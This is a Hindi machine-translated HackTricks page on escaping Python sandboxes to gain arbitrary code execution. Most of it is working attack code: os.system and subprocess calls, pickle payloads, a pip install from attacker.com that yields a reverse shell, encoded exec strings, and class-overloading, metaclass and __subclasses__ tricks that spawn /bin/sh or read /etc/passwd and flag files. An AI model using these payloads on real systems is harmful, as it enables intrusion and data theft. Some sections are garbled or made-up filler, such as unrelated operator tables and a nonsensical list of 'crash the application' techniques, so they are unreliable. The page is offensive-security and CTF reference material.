# पायथन सैंडबॉक्स को छलनी करें

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की आवश्यकता है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFT संग्रह**](https://opensea.io/collection/the-peass-family)
* [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **Twitter** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **अपने हैकिंग ट्रिक्स को** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **में PR जमा करके साझा करें।**

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

विशेषता को ध्यान में रखते हुए सबसे महत्वपूर्ण संकटों को खोजें ताकि आप उन्हें तेजी से ठीक कर सकें। Intruder आपकी हमले की सतह का ट्रैक करता है, प्रोएक्टिव धमकी स्कैन चलाता है, आपकी पूरी टेक स्टैक, एपीआई से वेब ऐप्स और क्लाउड सिस्टम तक, में समस्याओं को खोजता है। [**इसे नि: शुल्क परीक्षण के लिए आज़माएं**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)।

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

ये कुछ ट्रिक्स हैं जिनका उपयोग करके पायथन सैंडबॉक्स संरक्षण को छलनी करें और अनियमित कमांड्स को निष्पादित करें।

## कमांड निष्पादन पुस्तकालयें

पहली चीज जो आपको जाननी होगी वह यह है कि क्या आप किसी पहले से आयातित पुस्तकालय के साथ सीधे कोड निष्पादित कर सकते हैं, या क्या आप इन पुस्तकालयों में से कोई भी आयात कर सकते हैं:
```python
os.system("ls")
os.popen("ls").read()
commands.getstatusoutput("ls")
commands.getoutput("ls")
commands.getstatus("file/path")
subprocess.call("ls", shell=True)
subprocess.Popen("ls", shell=True)
pty.spawn("ls")
pty.spawn("/bin/bash")
platform.os.system("ls")
pdb.os.system("ls")

#Import functions to execute commands
importlib.import_module("os").system("ls")
importlib.__import__("os").system("ls")
imp.load_source("os","/usr/lib/python3.8/os.py").system("ls")
imp.os.system("ls")
imp.sys.modules["os"].system("ls")
sys.modules["os"].system("ls")
__import__("os").system("ls")
import os
from os import *

#Other interesting functions
open("/etc/passwd").read()
open('/var/www/html/input', 'w').write('123')

#In Python2.7
execfile('/usr/lib/python2.7/os.py')
system('ls')
```
याद रखें कि _**open**_ और _**read**_ फ़ंक्शन पायथन सैंडबॉक्स के अंदर फ़ाइलें पढ़ने और सैंडबॉक्स को उम्मीद से बाहर निकलने के लिए कुछ कोड लिखने में उपयोगी हो सकते हैं।

{% hint style="danger" %}
**Python2 input()** फ़ंक्शन के द्वारा कोड क्रैश होने से पहले पायथन कोड को निष्पादित करने की अनुमति होती है।
{% endhint %}

पायथन कोशिश करता है कि पहले **वर्तमान निर्देशिका से पुस्तकालयों को लोड करें** (निम्नलिखित कमांड पायथन मॉड्यूल को कहां से लोड कर रहा है वह प्रिंट करेगी): `python3 -c 'import sys; print(sys.path)'`

![](<../../../.gitbook/assets/image (552).png>)

## डिफ़ॉल्ट स्थापित पायथन पैकेज के साथ पिकल सैंडबॉक्स को छोड़ें

### डिफ़ॉल्ट पैकेज

आप यहां **पूर्व-स्थापित** पैकेजों की सूची पा सकते हैं: [https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)\
ध्यान दें कि पिकल से आप पायथन एनवी को **व्यवस्थित पुस्तकालयों** को आयात करने के लिए प्रणाली में स्थापित किया जा सकता है।\
उदाहरण के लिए, निम्नलिखित पिकल, जब लोड होता है, इसे उपयोग करने के लिए पिप पुस्तकालय को आयात करेगा:
```python
#Note that here we are importing the pip library so the pickle is created correctly
#however, the victim doesn't even need to have the library installed to execute it
#the library is going to be loaded automatically

import pickle, os, base64, pip
class P(object):
def __reduce__(self):
return (pip.main,(["list"],))

print(base64.b64encode(pickle.dumps(P(), protocol=0)))
```
ज्यादा जानकारी के लिए पिकल कैसे काम करता है इस लिंक पर जाएं: [https://checkoway.net/musings/pickle/](https://checkoway.net/musings/pickle/)

### पिप पैकेज

**@isHaacK** द्वारा साझा किया गया ट्रिक

यदि आपके पास `pip` या `pip.main()` का उपयोग करने की सुविधा है, तो आप किसी भी पैकेज को स्थापित कर सकते हैं और एक रिवर्स शेल प्राप्त कर सकते हैं जिसे आप निम्नलिखित कॉल करके प्राप्त कर सकते हैं:
```bash
pip install http://attacker.com/Rerverse.tar.gz
pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
```
आप यहां रिवर्स शैल बनाने के लिए पैकेज डाउनलोड कर सकते हैं। कृपया ध्यान दें कि इसे उपयोग करने से पहले आपको **इसे डीकंप्रेस करना होगा, `setup.py` बदलना होगा, और रिवर्स शैल के लिए अपना आईपी डालना होगा**:

{% file src="../../../.gitbook/assets/reverse.tar.gz" %}

{% hint style="info" %}
यह पैकेज `रिवर्स` कहलाता है। हालांकि, इसे विशेष रूप से तैयार किया गया है ताकि जब आप रिवर्स शैल से बाहर निकलें तो इंस्टॉलेशन का बाकी हिस्सा विफल हो जाएगा, इसलिए जब आप जाते हैं तो कोई अतिरिक्त पायथन पैकेज सर्वर पर स्थापित नहीं होगा।
{% endhint %}

## पायथन कोड को इवैल करना

{% hint style="warning" %}
ध्यान दें कि exec बहुलक तंत्रिका और ";" को स्वीकार करता है, लेकिन eval नहीं करता है (वॉलरस ऑपरेटर की जांच करें)
{% endhint %}

यदि कुछ वर्णों को प्रतिबंधित किया गया है, तो आप **हेक्स/ऑक्टल/B64** प्रतिष्ठान का उपयोग करके प्रतिबंध को **दौर देने** के लिए उपयोग कर सकते हैं:
```python
exec("print('RCE'); __import__('os').system('ls')") #Using ";"
exec("print('RCE')\n__import__('os').system('ls')") #Using "\n"
eval("__import__('os').system('ls')") #Eval doesn't allow ";"
eval(compile('print("hello world"); print("heyy")', '<stdin>', 'exec')) #This way eval accept ";"
__import__('timeit').timeit("__import__('os').system('ls')",number=1)
#One liners that allow new lines and tabs
eval(compile('def myFunc():\n\ta="hello word"\n\tprint(a)\nmyFunc()', '<stdin>', 'exec'))
exec(compile('def myFunc():\n\ta="hello word"\n\tprint(a)\nmyFunc()', '<stdin>', 'exec'))
```

```python
#Octal
exec("\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\171\163\164\145\155\50\47\154\163\47\51")
#Hex
exec("\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x6c\x73\x27\x29")
#Base64
exec('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='.decode("base64")) #Only python2
exec(__import__('base64').b64decode('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='))
```
### अन्य पुस्तकालय जो पायथन कोड का मूल्यांकन करने की अनुमति देती हैं

There are several other libraries that allow for the evaluation of Python code.
```python
#Pandas
import pandas as pd
df = pd.read_csv("currency-rates.csv")
df.query('@__builtins__.__import__("os").system("ls")')
df.query("@pd.io.common.os.popen('ls').read()")
df.query("@pd.read_pickle('http://0.0.0.0:6334/output.exploit')")

# The previous options work but others you might try give the error:
# Only named functions are supported
# Like:
df.query("@pd.annotations.__class__.__init__.__globals__['__builtins__']['eval']('print(1)')")
```
## ऑपरेटर और छोटे ट्रिक्स

### Arithmetic Operators (अंकगणितीय ऑपरेटर)

| Operator | Description | Example |
|----------|-------------|---------|
| +        | Addition    | a + b   |
| -        | Subtraction | a - b   |
| *        | Multiplication | a * b |
| /        | Division    | a / b   |
| %        | Modulus (Remainder) | a % b |
| //       | Floor Division | a // b |
| **       | Exponentiation | a ** b |

### Comparison Operators (तुलना ऑपरेटर)

| Operator | Description | Example |
|----------|-------------|---------|
| ==       | Equal       | a == b  |
| !=       | Not Equal   | a != b  |
| >        | Greater than | a > b   |
| <        | Less than    | a < b   |
| >=       | Greater than or equal to | a >= b |
| <=       | Less than or equal to | a <= b |

### Logical Operators (तार्किक ऑपरेटर)

| Operator | Description | Example |
|----------|-------------|---------|
| and      | Logical AND | a and b |
| or       | Logical OR  | a or b  |
| not      | Logical NOT | not a   |

### Assignment Operators (सौंपन ऑपरेटर)

| Operator | Description | Example |
|----------|-------------|---------|
| =        | Assigns a value from the right side to the left side | a = b |
| +=       | Adds the right operand to the left operand and assigns the result to the left operand | a += b |
| -=       | Subtracts the right operand from the left operand and assigns the result to the left operand | a -= b |
| *=       | Multiplies the right operand with the left operand and assigns the result to the left operand | a *= b |
| /=       | Divides the left operand by the right operand and assigns the result to the left operand | a /= b |
| %=       | Takes the modulus using two operands and assigns the result to the left operand | a %= b |
| //=      | Performs floor division on operators and assigns the result to the left operand | a //= b |
| **=      | Performs exponential (power) calculation on operators and assigns the result to the left operand | a **= b |

### Short Tricks (छोटे ट्रिक्स)

- To swap two variables without using a temporary variable:
```python
a, b = b, a
```

- To increment a variable by 1:
```python
a += 1
```

- To decrement a variable by 1:
```python
a -= 1
```

- To check if a number is even:
```python
if num % 2 == 0:
    print("Even")
```

- To check if a number is odd:
```python
if num % 2 != 0:
    print("Odd")
```

- To check if a number is positive:
```python
if num > 0:
    print("Positive")
```

- To check if a number is negative:
```python
if num < 0:
    print("Negative")
```

- To check if a number is zero:
```python
if num == 0:
    print("Zero")
```

- To check if a string is empty:
```python
if not string:
    print("Empty")
```

- To check if a list is empty:
```python
if not lst:
    print("Empty")
```

- To check if a dictionary is empty:
```python
if not dct:
    print("Empty")
```

- To check if a variable is None:
```python
if var is None:
    print("None")
```
```python
# walrus operator allows generating variable inside a list
## everything will be executed in order
## From https://ur4ndom.dev/posts/2020-06-29-0ctf-quals-pyaucalc/
[a:=21,a*2]
[y:=().__class__.__base__.__subclasses__()[84]().load_module('builtins'),y.__import__('signal').alarm(0), y.exec("import\x20os,sys\nclass\x20X:\n\tdef\x20__del__(self):os.system('/bin/sh')\n\nsys.modules['pwnd']=X()\nsys.exit()", {"__builtins__":y.__dict__})]
## This is very useful for code injected inside "eval" as it doesn't support multiple lines or ";"
```
## एनकोडिंग (UTF-7) के माध्यम से सुरक्षा को दौर देना

[**इस लेख**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy) में UTF-7 का उपयोग किया जाता है ताकि एक प्रतीत सैंडबॉक्स के भीतर अनियमित पायथन कोड लोड और निष्पादित किया जा सके:
```python
assert b"+AAo-".decode("utf_7") == "\n"

payload = """
# -*- coding: utf_7 -*-
def f(x):
return x
#+AAo-print(open("/flag.txt").read())
""".lstrip()
```
इसे अन्य इनकोडिंग का उपयोग करके भी बाईपास किया जा सकता है, जैसे `raw_unicode_escape` और `unicode_escape`.

## कॉल के बिना पायथन निष्पादन

यदि आप एक पायथन जेल में हैं जहां **आपको कॉल करने की अनुमति नहीं है**, तो फिर भी कुछ तरीके हैं **विभिन्न फंक्शन, कोड** और **कमांड** को **निष्पादित** करने के लिए।

### [डेकोरेटर](https://docs.python.org/3/glossary.html#term-decorator) के साथ RCE
```python
# From https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/
@exec
@input
class X:
pass

# The previous code is equivalent to:
class X:
pass
X = input(X)
X = exec(X)

# So just send your python code when prompted and it will be executed


# Another approach without calling input:
@eval
@'__import__("os").system("sh")'.format
class _:pass
```
### RCE ऑब्जेक्ट बनाने और ओवरलोड करने के द्वारा बाइपास

यदि आप **एक कक्षा घोषित** कर सकते हैं और उस कक्षा के **एक ऑब्जेक्ट** बना सकते हैं, तो आप **विभिन्न विधियों को लिख सकते हैं / ओवरराइट कर सकते हैं** जो **सीधे उन्हें बुलाने की आवश्यकता नहीं होती** है।

#### कस्टम कक्षाओं के साथ RCE

आप कुछ **कक्षा विधियों** को संशोधित कर सकते हैं (_मौजूदा कक्षा विधियों को ओवरराइट करके या एक नई कक्षा बनाकर_) ताकि जब उन्हें **बुलाया जाए**, तो वे **अनियमित कोड को निष्पादित** करें।
```python
# This class has 3 different ways to trigger RCE without directly calling any function
class RCE:
def __init__(self):
self += "print('Hello from __init__ + __iadd__')"
__iadd__ = exec #Triggered when object is created
def __del__(self):
self -= "print('Hello from __del__ + __isub__')"
__isub__ = exec #Triggered when object is created
__getitem__ = exec #Trigerred with obj[<argument>]
__add__ = exec #Triggered with obj + <argument>

# These lines abuse directly the previous class to get RCE
rce = RCE() #Later we will see how to create objects without calling the constructor
rce["print('Hello from __getitem__')"]
rce + "print('Hello from __add__')"
del rce

# These lines will get RCE when the program is over (exit)
sys.modules["pwnd"] = RCE()
exit()

# Other functions to overwrite
__sub__ (k - 'import os; os.system("sh")')
__mul__ (k * 'import os; os.system("sh")')
__floordiv__ (k // 'import os; os.system("sh")')
__truediv__ (k / 'import os; os.system("sh")')
__mod__ (k % 'import os; os.system("sh")')
__pow__ (k**'import os; os.system("sh")')
__lt__ (k < 'import os; os.system("sh")')
__le__ (k <= 'import os; os.system("sh")')
__eq__ (k == 'import os; os.system("sh")')
__ne__ (k != 'import os; os.system("sh")')
__ge__ (k >= 'import os; os.system("sh")')
__gt__ (k > 'import os; os.system("sh")')
__iadd__ (k += 'import os; os.system("sh")')
__isub__ (k -= 'import os; os.system("sh")')
__imul__ (k *= 'import os; os.system("sh")')
__ifloordiv__ (k //= 'import os; os.system("sh")')
__idiv__ (k /= 'import os; os.system("sh")')
__itruediv__ (k /= 'import os; os.system("sh")') (Note that this only works when from __future__ import division is in effect.)
__imod__ (k %= 'import os; os.system("sh")')
__ipow__ (k **= 'import os; os.system("sh")')
__ilshift__ (k<<= 'import os; os.system("sh")')
__irshift__ (k >>= 'import os; os.system("sh")')
__iand__ (k = 'import os; os.system("sh")')
__ior__ (k |= 'import os; os.system("sh")')
__ixor__ (k ^= 'import os; os.system("sh")')
```
#### [मेटाक्लासेस](https://docs.python.org/3/reference/datamodel.html#metaclasses) के साथ ऑब्जेक्ट्स बनाना

मेटाक्लासेस की मुख्य बात यह है कि यह हमें अनुक्रमिक रूप से कंस्ट्रक्टर को बुलाए बिना कक्षा के एक इंस्टेंस बनाने की अनुमति देता है, जिसके लिए लक्षित कक्षा को मेटाक्लास के रूप में एक नई कक्षा बनाई जाती है।
```python
# Code from https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/ and fixed
# This will define the members of the "subclass"
class Metaclass(type):
__getitem__ = exec # So Sub[string] will execute exec(string)
# Note: Metaclass.__class__ == type

class Sub(metaclass=Metaclass): # That's how we make Sub.__class__ == Metaclass
pass # Nothing special to do

Sub['import os; os.system("sh")']

## You can also use the tricks from the previous section to get RCE with this object
```
#### अपवाद के साथ ऑब्जेक्ट बनाना

जब एक **अपवाद ट्रिगर होता है**, तो **ऑब्जेक्ट** का **निर्माण होता है** बिना आपको सीधे कंस्ट्रक्टर को कॉल करने की आवश्यकता होती है (एक ट्रिक [**@\_nag0mez**](https://mobile.twitter.com/\_nag0mez) से):
```python
class RCE(Exception):
def __init__(self):
self += 'import os; os.system("sh")'
__iadd__ = exec #Triggered when object is created
raise RCE #Generate RCE object


# RCE with __add__ overloading and try/except + raise generated object
class Klecko(Exception):
__add__ = exec

try:
raise Klecko
except Klecko as k:
k + 'import os; os.system("sh")' #RCE abusing __add__

## You can also use the tricks from the previous section to get RCE with this object
```
### अधिक RCE

RCE (दूरस्थ कोड निष्पादन) के लिए अधिक तकनीकें

यदि आपको एक संदूकची या सैंडबॉक्स को दौर करने की आवश्यकता है, तो निम्नलिखित तकनीकें आपकी मदद कर सकती हैं:

1. **अनुप्रयोग को बंद करें**: यदि आपको अनुप्रयोग को बंद करने की अनुमति है, तो आप उसे बंद करके उसके संदूकची को दौर कर सकते हैं।

2. **अनुप्रयोग को रीस्टार्ट करें**: यदि आपको अनुप्रयोग को रीस्टार्ट करने की अनुमति है, तो आप उसे रीस्टार्ट करके उसके संदूकची को दौर कर सकते हैं।

3. **अनुप्रयोग को अपवाद करें**: यदि आपको अनुप्रयोग को अपवाद करने की अनुमति है, तो आप उसे अपवाद करके उसके संदूकची को दौर कर सकते हैं।

4. **अनुप्रयोग को अपवाद करें और फिर से शुरू करें**: यदि आपको अनुप्रयोग को अपवाद करने और फिर से शुरू करने की अनुमति है, तो आप उसे अपवाद करके उसके संदूकची को दौर कर सकते हैं।

5. **अनुप्रयोग को अपवाद करें और नया अनुप्रयोग शुरू करें**: यदि आपको अनुप्रयोग को अपवाद करने और नया अनुप्रयोग शुरू करने की अनुमति है, तो आप उसे अपवाद करके नये संदूकची को दौर कर सकते हैं।

6. **अनुप्रयोग को अपवाद करें और अन्य अनुप्रयोग शुरू करें**: यदि आपको अनुप्रयोग को अपवाद करने और अन्य अनुप्रयोग शुरू करने की अनुमति है, तो आप उसे अपवाद करके अन्य संदूकची को दौर कर सकते हैं।

7. **अनुप्रयोग को अपवाद करें और अनुप्रयोग को बंद करें**: यदि आपको अनुप्रयोग को अपवाद करने और अनुप्रयोग को बंद करने की अनुमति है, तो आप उसे अपवाद करके उसके संदूकची को दौर कर सकते हैं और उसे बंद कर सकते हैं।

8. **अनुप्रयोग को अपवाद करें और अनुप्रयोग को रीस्टार्ट करें**: यदि आपको अनुप्रयोग को अपवाद करने और अनुप्रयोग को रीस्टार्ट करने की अनुमति है, तो आप उसे अपवाद करके उसके संदूकची को दौर कर सकते हैं और उसे रीस्टार्ट कर सकते हैं।

9. **अनुप्रयोग को अपवाद करें और अनुप्रयोग को अपवाद करें**: यदि आपको अनुप्रयोग को अपवाद करने और अनुप्रयोग को अपवाद करने की अनुमति है, तो आप उसे अपवाद करके उसके संदूकची को दौर कर सकते हैं और उसे अपवाद कर सकते हैं।

10. **अनुप्रयोग को अपवाद करें और अनुप्रयोग को अपवाद करें और फिर से शुरू करें**: यदि आपको अनुप्रयोग को अपवाद करने, अनुप्रयोग को अपवाद करने और फिर से शुरू करने की अनुमति है, तो आप उसे अपवाद करके उसके संदूकची को दौर कर सकते हैं और उसे अपवाद कर सकते हैं और उसे फिर से शुरू कर सकते हैं।

ये तकनीकें आपको अधिक RCE (दूरस्थ कोड निष्पादन) के लिए मदद कर सकती हैं।
```python
# From https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/
# If sys is imported, you can sys.excepthook and trigger it by triggering an error
class X:
def __init__(self, a, b, c):
self += "os.system('sh')"
__iadd__ = exec
sys.excepthook = X
1/0 #Trigger it

# From https://github.com/google/google-ctf/blob/master/2022/sandbox-treebox/healthcheck/solution.py
# The interpreter will try to import an apt-specific module to potentially
# report an error in ubuntu-provided modules.
# Therefore the __import__ functions are overwritten with our RCE
class X():
def __init__(self, a, b, c, d, e):
self += "print(open('flag').read())"
__iadd__ = eval
__builtins__.__import__ = X
{}[1337]
```
### बिल्टइंस की मदद और लाइसेंस के साथ फ़ाइल पढ़ें

यदि आपको Python सैंडबॉक्स को दुर्भाग्य से उम्मीद से अधिक सुरक्षित किया गया है, तो आपको फ़ाइल पढ़ने के लिए बिल्टइंस मॉड्यूल की मदद ले सकते हैं। इसके लिए आपको निम्नलिखित कदमों का पालन करना होगा:

1. `builtins` मॉड्यूल को आवश्यकतानुसार आयात करें।
2. `open()` फ़ंक्शन का उपयोग करके फ़ाइल खोलें और उसे एक वेरिएबल में संग्रहीत करें।
3. फ़ाइल को पढ़ने के लिए `read()` फ़ंक्शन का उपयोग करें।
4. फ़ाइल को बंद करने के लिए `close()` फ़ंक्शन का उपयोग करें।

यहां एक उदाहरण है:

```python
import builtins

def read_file(file_path):
    file = builtins.open(file_path, 'r')
    content = file.read()
    file.close()
    return content

file_path = '/path/to/file.txt'
file_content = read_file(file_path)
print(file_content)
```

इस तरह से, आप `builtins` मॉड्यूल की मदद से Python सैंडबॉक्स को बाइपास करके फ़ाइलों को पढ़ सकते हैं।
```python
__builtins__.__dict__["license"]._Printer__filenames=["flag"]
a = __builtins__.help
a.__class__.__enter__ = __builtins__.__dict__["license"]
a.__class__.__exit__ = lambda self, *args: None
with (a as b):
pass
```
<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

सबसे महत्वपूर्ण संकटों को ढूंढें ताकि आप उन्हें तेजी से ठीक कर सकें। Intruder आपकी हमले की सतह का ट्रैक करता है, प्रोएक्टिव धारणा स्कैन चलाता है, आपकी पूरी टेक स्टैक, एपीआई से वेब ऐप्स और क्लाउड सिस्टम तक, में समस्याएं खोजता है। [**अभी मुफ्त में इसे ट्राय करें**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) आज ही।

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## बिल्टिन्स

* [**पायथन 2 की बिल्टिन्स फंक्शन**](https://docs.python.org/2/library/functions.html)
* [**पायथन 3 की बिल्टिन्स फंक्शन**](https://docs.python.org/3/library/functions.html)

यदि आप **`__builtins__`** ऑब्जेक्ट तक पहुंच सकते हैं तो आप पुस्तकालयों को आयात कर सकते हैं (ध्यान दें कि आप यहां अन्य स्ट्रिंग प्रतिनिधि का उपयोग भी कर सकते हैं जो पिछले खंड में दिखाया गया है):
```python
__builtins__.__import__("os").system("ls")
__builtins__.__dict__['__import__']("os").system("ls")
```
### कोई निर्मित नहीं

जब आपके पास `__builtins__` नहीं होता है, तो आप कुछ भी इंपोर्ट नहीं कर सकते हैं और न ही फ़ाइलें पढ़ सकते हैं यहां तक कि **सभी ग्लोबल फ़ंक्शन** (जैसे `open`, `import`, `print`...) **लोड नहीं होते हैं**।\
हालांकि, **डिफ़ॉल्ट रूप से पायथन मेमोरी में कई मॉड्यूल इंपोर्ट करता हैं**। ये मॉड्यूल अज्ञातजनक लग सकते हैं, लेकिन इनमें से कुछ में खतरनाक फ़ंक्शनेलिटीज़ भी हो सकती हैं जिन्हें उपयोग करके यहां तक कि **अनियमित कोड निष्पादन** भी किया जा सकता है।

निम्नलिखित उदाहरणों में आप देख सकते हैं कि कैसे इन "**अज्ञातजनक**" मॉड्यूलों का दुरुपयोग करके उनमें मौजूद **खतरनाक** **फ़ंक्शनेलिटीज़** तक पहुंचा जा सकता है।

**Python2**
```python
#Try to reload __builtins__
reload(__builtins__)
import __builtin__

# Read recovering <type 'file'> in offset 40
().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()
# Write recovering <type 'file'> in offset 40
().__class__.__bases__[0].__subclasses__()[40]('/var/www/html/input', 'w').write('123')

# Execute recovering __import__ (class 59s is <class 'warnings.catch_warnings'>)
().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']('os').system('ls')
# Execute (another method)
().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__("func_globals")['linecache'].__dict__['os'].__dict__['system']('ls')
# Execute recovering eval symbol (class 59 is <class 'warnings.catch_warnings'>)
().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]["eval"]("__import__('os').system('ls')")

# Or you could obtain the builtins from a defined function
get_flag.__globals__['__builtins__']['__import__']("os").system("ls")
```
#### पायथन3

Python3 is a powerful programming language that is widely used for various purposes, including web development, data analysis, and automation. It provides a rich set of libraries and frameworks that make it easy to develop complex applications.

पायथन3 एक शक्तिशाली प्रोग्रामिंग भाषा है जो विभिन्न उद्देश्यों के लिए व्यापक रूप से उपयोग की जाती है, जिसमें वेब विकास, डेटा विश्लेषण और स्वचालन शामिल हैं। इसमें एक समृद्ध सेट की पुस्तकालयें और फ्रेमवर्क्स होते हैं जो जटिल एप्लिकेशन विकसित करने को आसान बनाते हैं।

#### Bypassing Python Sandboxes

#### पायथन सैंडबॉक्स को छलना

Python sandboxes are security mechanisms that restrict the execution of certain operations or limit access to sensitive resources. They are commonly used to provide a safe environment for executing untrusted code.

पायथन सैंडबॉक्स सुरक्षा तंत्र होते हैं जो कुछ ऑपरेशनों के निष्पादन को प्रतिबंधित करते हैं या संवेदनशील संसाधनों तक पहुंच को सीमित करते हैं। ये आमतौर पर अविश्वसनीय कोड को निष्पादित करने के लिए एक सुरक्षित वातावरण प्रदान करने के लिए उपयोग होते हैं।

There are various techniques that can be used to bypass Python sandboxes and execute arbitrary code. These techniques exploit vulnerabilities in the sandbox implementation or leverage specific features of the Python language.

पायथन सैंडबॉक्स को छलने और अनियमित कोड को निष्पादित करने के लिए विभिन्न तकनीकों का उपयोग किया जा सकता है। ये तकनीकें सैंडबॉक्स के अमलन को उद्दीपित करने या पायथन भाषा की विशेषताओं का लाभ उठाने के लिए संवेदनशीलताओं का उपयोग करती हैं।

In this section, we will explore some common techniques for bypassing Python sandboxes and executing arbitrary code.

इस खंड में, हम पायथन सैंडबॉक्स को छलने और अनियमित कोड को निष्पादित करने के लिए कुछ सामान्य तकनीकों का पता लगाएंगे।
```python
# Obtain builtins from a globally defined function
# https://docs.python.org/3/library/functions.html
help.__call__.__builtins__ # or __globals__
license.__call__.__builtins__ # or __globals__
credits.__call__.__builtins__ # or __globals__
print.__self__
dir.__self__
globals.__self__
len.__self__
__build_class__.__self__

# Obtain the builtins from a defined function
get_flag.__globals__['__builtins__']

# Get builtins from loaded classes
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"]
```
[**नीचे एक बड़ी फ़ंक्शन है**](./#recursive-search-of-builtins-globals) जहां आप **बिल्टिन्स** को ढूंढने के लिए दसों/**सैकड़ों** के **स्थान** ढूंढ सकते हैं।

#### Python2 और Python3
```python
# Recover __builtins__ and make everything easier
__builtins__= [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__
__builtins__["__import__"]('os').system('ls')
```
### बिल्टिन्स पेलोड्स

बिल्टिन्स पेलोड्स एक प्रकार के पायथन कोड होते हैं जो पायथन सैंडबॉक्स को भ्रष्ट करने के लिए उपयोग होते हैं। ये पेलोड्स विभिन्न तरीकों से बनाए जा सकते हैं और इन्हें एक पायथन सैंडबॉक्स को अपेक्षित तरीके से भ्रष्ट करने के लिए उपयोग किया जा सकता है। ये पेलोड्स विभिन्न बिल्टिन्स फंक्शन को उपयोग करते हैं जैसे `__import__`, `eval`, `exec`, `compile` आदि।

ये पेलोड्स आमतौर पर एक बाइनरी फ़ाइल के रूप में उपलब्ध होते हैं और इन्हें पायथन सैंडबॉक्स को भ्रष्ट करने के लिए उपयोग किया जा सकता है। इन पेलोड्स को उपयोग करने के लिए, आपको पहले इन्हें डिकोड करना होगा और फिर उन्हें पायथन सैंडबॉक्स में भेजना होगा। इसके बाद, ये पेलोड्स पायथन सैंडबॉक्स को भ्रष्ट करके आपको अनुमति देंगे कि आप अनुमतिप्राप्त कार्रवाई कर सकें।

ये पेलोड्स अत्यंत शक्तिशाली हो सकते हैं और इन्हें सावधानीपूर्वक उपयोग करना चाहिए। इन्हें केवल उच्चतम सुरक्षा स्तर वाले परीक्षण मामलों में उपयोग करें और केवल उन उद्देश्यों के लिए जहां आपको अधिकृत अनुमति हो।
```python
# Possible payloads once you have found the builtins
__builtins__["open"]("/etc/passwd").read()
__builtins__["__import__"]("os").system("ls")
# There are lots of other payloads that can be abused to execute commands
# See them below
```
## ग्लोबल्स और लोकल्स

**`globals`** और **`locals`** की जांच करना एक अच्छा तरीका है जिससे आप जान सकते हैं कि आप किसे एक्सेस कर सकते हैं।
```python
>>> globals()
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, 'attr': <module 'attr' from '/usr/local/lib/python3.9/site-packages/attr.py'>, 'a': <class 'importlib.abc.Finder'>, 'b': <class 'importlib.abc.MetaPathFinder'>, 'c': <class 'str'>, '__warningregistry__': {'version': 0, ('MetaPathFinder.find_module() is deprecated since Python 3.4 in favor of MetaPathFinder.find_spec() (available since 3.4)', <class 'DeprecationWarning'>, 1): True}, 'z': <class 'str'>}
>>> locals()
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, 'attr': <module 'attr' from '/usr/local/lib/python3.9/site-packages/attr.py'>, 'a': <class 'importlib.abc.Finder'>, 'b': <class 'importlib.abc.MetaPathFinder'>, 'c': <class 'str'>, '__warningregistry__': {'version': 0, ('MetaPathFinder.find_module() is deprecated since Python 3.4 in favor of MetaPathFinder.find_spec() (available since 3.4)', <class 'DeprecationWarning'>, 1): True}, 'z': <class 'str'>}

# Obtain globals from a defined function
get_flag.__globals__

